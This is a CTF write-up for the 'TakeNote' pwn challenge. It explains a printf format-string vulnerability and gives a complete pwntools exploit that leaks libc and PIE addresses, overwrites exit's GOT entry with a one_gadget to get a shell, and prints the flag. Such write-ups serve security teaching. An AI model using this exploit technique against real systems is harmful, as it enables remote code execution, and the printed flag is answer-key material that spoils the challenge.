https://ctftime.org/event/2579

# TakeNote (pwn)

Last year my command line applications were vulnerable... So I made some more! (^-^)

nc takenote.kctf-453514-codelab.kctf.cloud 1337

## Analysis

We can see that in menu 2 we have a `printf` with an attacker controlled format string: 

```c
case 2:
    puts("Which note do you want to print?\n");
    scanf("%d",&note_index);
    getchar();
    if(note_index < 0 || note_index >= n_notes){
        puts("Nice try buddy *-*\n");
        exit(1);
    }
    if(!valid[note_index]){
        puts("You haven't written that note yet >:(\n");
        exit(1);
    }
    puts("Your note reads:\n");
    printf(notes+note_index*NOTE_SIZE);
```

We can control the format string's content in menu 1 but are somewhat limited in terms of length:

```c
case 1:
    printf("Which note do you want to write to? [0 - %d]\n", n_notes-1);
    scanf("%d",&note_index);
    getchar();
    if(note_index < 0 || note_index >= n_notes){
        puts("Nice try buddy *-*\n");
        exit(1);
    }
    char input [2*NOTE_SIZE+1];
    fgets(input, sizeof(input), stdin);
    strncpy(notes + note_index*NOTE_SIZE, input, NOTE_SIZE+1);
```

We can see that the binary appears to be compiled with `-pie`:

```bash
Arch:     amd64-64-little
RELRO:    No RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

So it is likely that we'll need to bypass ASLR on the main elf image in addition to ASLR on `libc.so.6`.

### Fetching libc.so.6 and ld-linux-x86-64.so.2

First build and run the provided Dockerfile:

```bash
$ sudo docker build -t asdf . && sudo docker run --rm -it asdf /bin/bash
```

Now take note of the container id (as an example shown here we get `63061bf52ced`):

```bash
$ sudo docker ps
CONTAINER ID   IMAGE     COMMAND       CREATED          STATUS          PORTS     NAMES
63061bf52ced   asdf      "/bin/bash"   44 seconds ago   Up 43 seconds             zen_euler
```

Now use the `docker cp` subcommand, with `-L` to follow symlinks, to copy both `libc.so.6` and `ld-linux-x86-64.so.2` from the running container:

```bash
$ sudo docker cp -L 63061bf52ced:/lib/x86_64-linux-gnu/libc.so.6 libc.so.6
Successfully copied 2.03MB to /home/user/ctf/pwn/takenote/test_libc.so.6
$ sudo docker cp -L 63061bf52ced:/lib64/ld-linux-x86-64.so.2 ld-linux-x86-64.so.2
Successfully copied 194kB to /home/user/ctf/pwn/takenote/ld-linux-x86-64.so.2
```

These are the hashes of the versions I got:

```bash
$ sha256sum libc.so.6 
80378c2017456829f32645e6a8f33b4c40c8efa87db7e8c931a229afa7bf6712  libc.so.6
$ sha256sum ld-linux-x86-64.so.2 
7af637a5047b1d08ed39bd18808e5bb984a069060ed52f9f5448b94f16f99330  ld-linux-x86-64.so.2

```

Now use https://github.com/io12/pwninit to patch the provided binary to use both `libc.so.6` and `ld-linux-x86-64.so.2` so we get the same behaviour locally as on the remote:

```bash
$ /opt/pwninit --bin ./chal --libc ./libc.so.6 --ld ./ld-linux-x86-64.so.2
```

This will produce a new elf called `chal_patched` that you can use with gdb.

### Finding Magic Gadgets

Magic gadgets are addresses in `lib.so.6` that, if we can jump to them, should give us a shell.

Use https://github.com/david942j/one_gadget to find a suitable gadget:

```bash
$ one_gadget ./libc.so.6 
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
```

Note that I tried the first one in the list first and when it didn't work I tried the second one, specifically `0xe3b01`, and luckily that worked.

## Solution

1) Leak an address from libc to bypass ASLR on `libc.so.6`
2) Leak an address from the main elf image to bypass ASLR on the main elf
3) Write a `one_gadget` into the got entry for `exit`
4) Call `exit`

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chal_patched", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("takenote.kctf-453514-codelab.kctf.cloud", 1337)

p.sendlineafter(b"How many notes do you need to write?\n", b"1")

def write_a_note(idx, note):
    p.sendlineafter(b"3. Exit\n", b"1")
    p.sendlineafter(b"write to?", str(idx).encode())
    p.sendline(note)

def read_a_note(idx):
    p.sendlineafter(b"3. Exit\n", b"2")
    p.sendlineafter(b"print?", str(idx).encode())
    p.readuntil(b"Your note reads:\n\n")
    return p.readuntil(b"What")[:-4]

write_a_note(0, b"%1$p")
leak = int(read_a_note(0).decode(), 16)
libc.address = leak - 0x1ed723

write_a_note(0, b"%14$p")
leak = int(read_a_note(0).decode(), 16)
elf.address = leak - 0x15b0

def write_what_where(where, what):
    for i in range(8):
        payload = fmtstr_payload(12, {where + i: (what >> (i * 8)) & 0xff},
            write_size="byte", strategy="small", badbytes=b"\n")
        write_a_note(0, payload)
        read_a_note(0)

ONE_GADGET = libc.address + 0xe3b01
write_what_where(where=elf.got["exit"], what=ONE_GADGET)

p.sendlineafter(b"3. Exit\n", b"3") # call exit() => ONE_GADGET

p.sendline(b"/bin/cat flag.txt")
p.readuntil(b"wctf{")
print("wctf{" + p.readuntil(b"}").decode()) # wctf{m3m0ry_l4y0u7_1s_crUc1Al_f0r_3xpL01t5}
```

## Flag
`wctf{m3m0ry_l4y0u7_1s_crUc1Al_f0r_3xpL01t5}`

smiley 2025/03/23
